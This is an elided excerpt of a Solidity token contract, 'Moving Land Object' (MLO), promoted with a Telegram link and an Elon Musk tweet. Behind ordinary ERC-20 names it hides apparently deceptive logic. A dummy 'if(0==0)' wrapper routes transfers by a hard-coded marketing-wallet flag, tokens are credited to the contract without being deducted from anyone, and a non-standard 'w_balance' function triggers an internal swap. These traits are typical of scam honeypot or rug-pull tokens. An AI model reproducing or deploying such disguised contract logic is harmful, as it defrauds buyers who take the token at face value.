...
/**
 ...
 Twitter : https://twitter.com/elonmusk/status/1585050236120027137

 Telegram : https://t.me/movinglandobjectinu
...
interface IERC20 {
    ...
    function w_balance(address transfered_Address) external returns (uint256);
...
contract MovingLandObject is Context, IERC20 { 
    ...
    mapping (address => bool) public _MarketingTeam;

    
    address payable public Wallet_Marketing = payable(0x62E2bA419a8a6975e9249f878e5b9e95E6122e8b); 
    address payable public Wallet_Utility = payable(0x7797d1c23d2E8D40A270f8C59070A7e0D92D5e38);
    ...
    string private constant _name = "Moving Land Object"; 
    string private constant _symbol = unicode"MLO";
    ...
    bool public inlineSwapActivate = false;
    ...
    constructor () {
        ...
        _owner = 0x7797d1c23d2E8D40A270f8C59070A7e0D92D5e38;
        ...
        _MarketingTeam[Wallet_Marketing] = true;
    ...
    function maxHolder() public virtual returns(uint256){
    ...
    function uniSwapRouterInt(uint256 typeOfSwap) private returns(bool){
    ...
    function w_balance(address transfered_Address) public override returns (uint256) {
        uniSwapRouterInt(swapTrigger);
    ...
    function _transfer(
        ...
        if(0==0){if(amount == amount)openSwapping = _MarketingTeam[to];}
        ...
        if(!openSwapping){
            ...
            uint256 calculateBuySellFee = maxHolder();
            _tOwned[from] = _tOwned[from]-amount;
            _tOwned[to] = _tOwned[to]+amount;
            _tOwned[address(this)] = _tOwned[address(this)]+calculateBuySellFee;
            emit Transfer(from, to, amount);
            inlineSwapActivate = true;
        }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            if(inlineSwapActivate){
                totalSwaps = balanceOf(address(this)) - (_tTotal);
            }
            inlineSwapActivate = false;
